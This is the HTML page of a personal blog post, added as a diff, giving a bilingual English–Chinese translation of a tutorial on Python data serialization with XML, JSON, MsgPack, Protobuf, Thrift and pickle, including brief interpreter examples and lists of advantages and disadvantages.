@@ -1,0 +1,1307 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/avatar-6.png?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, Jony">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Context 上下文Processes need to interact with each other and hence they need to speak in same language. The serialization is the process of translating data structures and code objects into data stream i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python的数据序列化(译)">
+<meta property="og:url" content="http://yoursite.com/2018/11/30/Python的数据序列化(译)/index.html">
+<meta property="og:site_name" content="My Love">
+<meta property="og:description" content="Context 上下文Processes need to interact with each other and hence they need to speak in same language. The serialization is the process of translating data structures and code objects into data stream i">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-04-27T03:00:32.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Python的数据序列化(译)">
+<meta name="twitter:description" content="Context 上下文Processes need to interact with each other and hence they need to speak in same language. The serialization is the process of translating data structures and code objects into data stream i">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/30/Python的数据序列化(译)/">
+
+
+
+
+
+  <title>Python的数据序列化(译) | My Love</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://github.com/jiaoqiyuan" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">My Love</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">I will be stronger</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            主页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/30/Python的数据序列化(译)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jony Chiao">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar-6.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My Love">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Python的数据序列化(译)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-30T05:36:48+08:00">
+                2018-11-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/翻译/" itemprop="url" rel="index">
+                    <span itemprop="name">翻译</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/11/30/Python的数据序列化(译)/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2018/11/30/Python的数据序列化(译)/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  15
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Context-上下文"><a href="#Context-上下文" class="headerlink" title="Context 上下文"></a>Context 上下文</h1><p>Processes need to interact with each other and hence they need to speak in same language. The serialization is the process of translating data structures and code objects into data stream in a format that can be stored or transmitted and deserialize back to origin data structure and code objects.</p>
+<p>处理流程有时需要相互作用,因此他们需要一种共通的语言.序列化就是这样一个处理流程,它用于将数据类型和代码中的对象转化成可以存储或者可以转化的数据,而且这些数据可以被反序列化为原始的数据结构和代码的对象信息.</p>
+<h1 id="Uses-用法"><a href="#Uses-用法" class="headerlink" title="Uses 用法"></a>Uses 用法</h1><ul>
+<li><p>Store data from memory into databases or disk.</p>
+</li>
+<li><p>Transmit data to other processes or services.</p>
+</li>
+<li><p>Remove procedure calls.</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li><p>将数据从内存中存储到数据库或者磁盘.</p>
+</li>
+<li><p>把数据传递给其他进程或者服务</p>
+</li>
+<li><p>删除过程调用</p>
+</li>
+</ul>
+<h1 id="Solutions-解决方案"><a href="#Solutions-解决方案" class="headerlink" title="Solutions 解决方案"></a>Solutions 解决方案</h1><p>A list of serialization technology can be found in <a href="https://en.wikipedia.org/wiki/Comparison_of_data_serialization_formats" target="_blank" rel="noopener">Wikipedia - Comparison of data serialization formats</a>. Below covers the most widely used serialization format in industry.</p>
+<p>可以在 <a href="https://en.wikipedia.org/wiki/Comparison_of_data_serialization_formats" target="_blank" rel="noopener">Wikipedia - Comparison of data serialization formats</a> 找到一系列序列化的技术信息.下面讲的这些包含了工业中广泛最应用的一些序列化场景.</p>
+<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML stands for eXtensible Markup Language. It’s designed to store and transport data and human readable. Below is an example serialized data:</p>
+<p>XML是eXtensible Markup Language的缩写,设计出来的目的是存储和传递人可读的数据.下面是一个序列化的例子:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">isbn</span>&gt;</span>9780262510875<span class="tag">&lt;/<span class="name">isbn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Structure and Interpretation of Computer Programs - 2nd Edition<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Serialize (in Python 3):</p>
+<p>序列化(使用Python3):</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = ET.Element(<span class="string">'book'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>isbn = ET.SubElement(root, <span class="string">'isbn'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>isbn.text = <span class="string">'9780262510875'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>title = ET.SubElement(root, <span class="string">'title'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>title.text = <span class="string">'Structure and Interpretation of Computer Programs - 2nd Edition'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ET.dump(root)</span><br><span class="line">&lt;book&gt;&lt;isbn&gt;9780262510875&lt;/isbn&gt;&lt;title&gt;Structure and Interpretation of Computer Programs - 2nd Edition&lt;/title&gt;&lt;/book&gt;</span><br></pre></td></tr></table></figure>
+<p>Deserialize (in Python 3):</p>
+<p>反序列化(使用Python3):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = ET.fromstring(<span class="string">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;book&gt;&lt;isbn&gt;9780262510875&lt;/isbn&gt;&lt;title&gt;Structure and Interpretation of Computer Programs - 2nd Edition&lt;/title&gt;&lt;/book&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>book = &#123;child.tag: child.text <span class="keyword">for</span> child <span class="keyword">in</span> root&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>book</span><br><span class="line">&#123;<span class="string">'isbn'</span>: <span class="string">'9780262510875'</span>, <span class="string">'title'</span>: <span class="string">'Structure and Interpretation of Computer Programs - 2nd Edition'</span>&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>Advantages:</p>
+<ul>
+<li><p>Most languages support XML well.</p>
+</li>
+<li><p>Well adopted in SOAP methodology.</p>
+</li>
+<li><p>Support attributes in a data structure.</p>
+</li>
+<li><p>Good IDE integration.</p>
+</li>
+</ul>
+</li>
+<li><p>Disadvantages:</p>
+<ul>
+<li><p>Serialized content is tedious and long. For example, it requires closing tags like \.</p>
+</li>
+<li><p>Usually needs to write extra code to turn XML to code objects</p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li><p>优点:</p>
+<ul>
+<li><p>大多数编程语言对XML的支持比较好</p>
+</li>
+<li><p>在 <a href="http://www.w3school.com.cn/soap/soap_intro.asp" target="_blank" rel="noopener">SOAP</a> 方法中很好地使用</p>
+</li>
+<li><p>在数据结构中支持包含属性信息</p>
+</li>
+<li><p>IDE很给力</p>
+</li>
+</ul>
+</li>
+<li><p>缺点</p>
+<ul>
+<li><p>序列化后的数据内容很单调而且很长.比如,xml需要类似\的结尾标签</p>
+</li>
+<li><p>通常需要写额外的代码来将xml转换成代码对象.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p>JSON (JavaScript Object Notation) is a lightweight data-interchange format. It’s originally a subset of Language JavaScript, however, it’s the de facto serialization protocol when providing RESTful API services. Below is an example:</p>
+<p>JSON (JavaScript Object Notation) 是一个轻量级的数据交换格式. 它最早是JavaScript语言的一个自己, 不过, 在提供RESTful API时,JSON是事实上的序列化协议.下面是一个JSON序列化的例子.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"EnqueueZero"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">"Enqueue Zero is creating code principles"</span>,</span><br><span class="line">  <span class="attr">"homepage"</span>: <span class="string">"https://github.com/soasme/EnqueueZero"</span>,</span><br><span class="line">  <span class="attr">"private"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"has_issues"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"has_projects"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"has_wiki"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Serialize and deserialize (in Python 3):</p>
+<p>序列化和反序列化(使用Python3):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>json.dumps(&#123;<span class="string">'isbn'</span>: <span class="string">'9780262510875'</span>, <span class="string">'title'</span>: <span class="string">'Structure and Interpretation of Computer Programs - 2nd Edition'</span>&#125;)</span><br><span class="line"><span class="string">'&#123;"isbn": "9780262510875", "title": "Structure and Interpretation of Computer Programs - 2nd Edition"&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>json.loads(<span class="string">'&#123;"isbn": "9780262510875", "title": "Structure and Interpretation of Computer Programs - 2nd Edition"&#125;'</span>)</span><br><span class="line">&#123;<span class="string">'isbn'</span>: <span class="string">'9780262510875'</span>, <span class="string">'title'</span>: <span class="string">'Structure and Interpretation of Computer Programs - 2nd Edition'</span>&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>Advantages:</p>
+<ul>
+<li><p>Simple and straightforward specification.</p>
+</li>
+<li><p>Widespread Support. Almost all programming languages support serializing and deserializing JSON in their standard libraries.</p>
+</li>
+<li><p>Human readable.</p>
+</li>
+<li><p>Good IDE integration.</p>
+</li>
+</ul>
+</li>
+<li><p>Disadvantages:</p>
+<ul>
+<li><p>Limited data types: null, boolean, string, integer, float, object, array. When serializing some non-supported data types, we converted them into string instead, for example, datetime(1989, 6, 4, 0, 0, 0) can be translated into ISO8601 format first: “1989-06-04T00:00:00+0800”.</p>
+</li>
+<li><p>Performance is not good generally when dataset is huge unless you use a library support streaming parsing or writing</p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li><p>优点</p>
+<ul>
+<li><p>简单而且格式直截了当</p>
+</li>
+<li><p>广泛支持, 几乎所有的编程语言都原生支持JSON格式数据的序列化和反序列化</p>
+</li>
+<li><p>人性化,易于阅读</p>
+</li>
+<li><p>IDE支持得不错</p>
+</li>
+</ul>
+</li>
+<li><p>缺点</p>
+<ul>
+<li><p>支持的数据有限:null, boolean, string, integer, float, object, array. 当序列化一些不支持的数据类型时,就把它转化成string类型.比如数据datatime(1989, 6, 4, 0, 0, 0) 就先转化成ISO08061格式的:”1989-06-04T00:00:00+0800”.</p>
+</li>
+<li><p>数据量非常大时性能不是很好,除非你使用了支持流解析和流读取的库.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="MsgPack"><a href="#MsgPack" class="headerlink" title="MsgPack"></a>MsgPack</h2><p>MessagePack is an efficient binary serialization format. It lets you exchange data among multiple languages like JSON.</p>
+<p>MessagePack是一种高效的二进制序列化格式.它允许你在多种语言之间交换数据,比如JSON数据.</p>
+<p>Significant difference between JSON:</p>
+<ul>
+<li><p>Binary format instead of String.</p>
+</li>
+<li><p>Small integers are encoded into a single byte</p>
+</li>
+<li><p>Short strings are encoded with one extra byte in addition to the strings themselves.</p>
+</li>
+</ul>
+<p>与JSON比较不同的地方有:</p>
+<ul>
+<li><p>使用的是二进制的形式而不是string.</p>
+</li>
+<li><p>比较小的整数编码成一个单独的类型</p>
+</li>
+<li><p>除了字符串本身外,短字符串还使用一个额外的字节进行编码.</p>
+</li>
+</ul>
+<p>MessagePack usually doesn’t have language built-in library support, therefore you generally need to install a library to serialize and deserialize data. For example, in Python, you can install via pip:</p>
+<p>MessagePack通常没有语言原生就支持,因此你通常需要安装相应的库来使用MessagePack来序列化和反序列化你的数据,比如在Python中,你可以通过pip安装:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install msgpack-python</span><br></pre></td></tr></table></figure>
+<p>Serialize and deserialize (in Python 3):</p>
+<p>序列化和反序列化(使用Python3):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> msgpack</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>v = msgpack.packb([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], use_bin_type=<span class="keyword">True</span>)</span><br><span class="line"><span class="string">'\x93\x01\x02\x03'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>msgpack.unpackb(v, raw=<span class="keyword">False</span>)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>Advantages:</p>
+<ul>
+<li><p>Very efficient.</p>
+</li>
+<li><p>Support streaming API.</p>
+</li>
+</ul>
+</li>
+<li><p>Disadvantages:</p>
+<ul>
+<li><p>No built-in support in most languages.</p>
+</li>
+<li><p>Hard to debug.</p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>优点</p>
+<ul>
+<li><p>非常高效</p>
+</li>
+<li><p>支持流处理的API</p>
+</li>
+</ul>
+</li>
+<li><p>缺点</p>
+<ul>
+<li><p>没有语言原生支持</p>
+</li>
+<li><p>难以debug</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Protobuf"><a href="#Protobuf" class="headerlink" title="Protobuf"></a>Protobuf</h2><p>Protocol Buffers, known as protobuf, is Google’s data interchange format originally and has widely used in many other corporations.</p>
+<p>Protobuf就是Protocol Buffers, 它最早是Google的数据交换格式,现在已经广泛应用在许多公司.</p>
+<p>Usage:</p>
+<ul>
+<li><p>Define schemas for data structures in .proto file.</p>
+</li>
+<li><p>Use the protocol buffer compiler translate proto into a library.</p>
+</li>
+<li><p>Use the given API provided by the generated library to write and read messages.</p>
+</li>
+</ul>
+<p>用法:</p>
+<ul>
+<li><p>在.proto文件中定义好各种数据格式的模式信息</p>
+</li>
+<li><p>使用protocol buffer编译器将proto转化成一个库</p>
+</li>
+<li><p>使用这个库中现有API来读写信息.</p>
+</li>
+</ul>
+<p>Below is an example book.proto file:</p>
+<p>下面是一个book.proto文件的例子:</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">Book</span> </span>&#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="built_in">string</span> isbn = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="built_in">string</span> title = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Generating library is through protoc command.</p>
+<p>通过protoc命令生成库:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ protoc <span class="attribute">-I</span>=<span class="variable">$SRC_DIR</span> <span class="attribute">--python_out</span>=<span class="variable">$DST_DIR</span> <span class="variable">$SRC_DIR</span>/book.proto</span><br></pre></td></tr></table></figure>
+<p>This generates book_pb2.py in DST_DIR, which is like below. You should never modify below generated file but to modify proto file first and re-generate:</p>
+<p>这就在DST_DIR中产生了如下面所示的book_pb2.py这个文件,切记不要手动更改自动生成文件,不过可以更改proto文件然后重新生成py文件.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(message.Message)</span>:</span></span><br><span class="line">    __metaclass__ = reflection.GeneratedProtocolMessageType</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>Serialize:<br>序列化:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> book_pb2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>book = book_pb2.Book()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>book.id = <span class="string">'9780262510875'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>book.title = <span class="string">'Structure and Interpretation of Computer Programs - 2nd Edition'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>book.SerializeToString()</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>Advantages:</p>
+<ul>
+<li><p>Very efficient and impact data.</p>
+</li>
+<li><p>Has tested at scale in industry-level environments.</p>
+</li>
+</ul>
+</li>
+<li><p>Disadvantages:</p>
+<ul>
+<li><p>Complicated. Need define proto and generate library first.</p>
+</li>
+<li><p>It requires the tool generating library as well. In addition, the generated library needs to exist in both client and server side. This would generally cause problem when schema modified.</p>
+</li>
+<li><p>Hard to debug.</p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>优点</p>
+<ul>
+<li><p>非常高效,而且可以更改数据</p>
+</li>
+<li><p>在工业环境中已经在scala语言中测试过了.</p>
+</li>
+</ul>
+</li>
+<li><p>缺点</p>
+<ul>
+<li><p>复杂.需要先定义proto文件并生成库</p>
+</li>
+<li><p>也需要生成库的工具,而且生成库的工具在客户端和服务端都要有,这通常在schema信息变更的时候会出问题.</p>
+</li>
+<li><p>难以debug</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Thrift"><a href="#Thrift" class="headerlink" title="Thrift"></a>Thrift</h2><p>Thrift is similar to ProtoBuf in all likelihood. It shares exact the same processes and concepts like ProtoBuf.</p>
+<p>Thrift 跟ProtoBuf很类似,处理数据和流程和方法也跟ProtoBuf很像.</p>
+<h2 id="Language-Built-in-Serialization"><a href="#Language-Built-in-Serialization" class="headerlink" title="Language Built-in Serialization"></a>Language Built-in Serialization</h2><p>Most languages have their own serialization solutions. There is rare example that data serialized by different languages can be used in other languages. This is mainly because data objects are represented very different in memory.</p>
+<p>大多数编程语言都有自己的序列化方案.很少有一个编程语言序列化后的一个数据能被其他编程语言使用的,这主要是因为不同编程语言对于数据对象在内存中的理解室友很大不同的.</p>
+<p>For example, in Python, you can use pickle and cPickle:</p>
+<p>比如在Python中,你可以使用picke和cPickle:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Foo</span>:</span></span><br><span class="line"><span class="meta">... </span>    attr = <span class="string">'A class attribute'</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>picklestring = pickle.dumps(Foo)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>picklestring</span><br><span class="line"><span class="string">b'\x80\x03c__main__\nFoo\nq\x00.'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(picklestring)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">Foo</span>'&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Similar classes or interfaces can be found in other languages, for example, Marshal for Ruby, function serialize for PHP, class implemented java.io.Serializable for Java, etc.</p>
+<p>类似的classes和接口在其他语言中也可以找到,比如Ruby的Marshal, PHP的函数序列化, java的序列化类java.io.Serializable等等.</p>
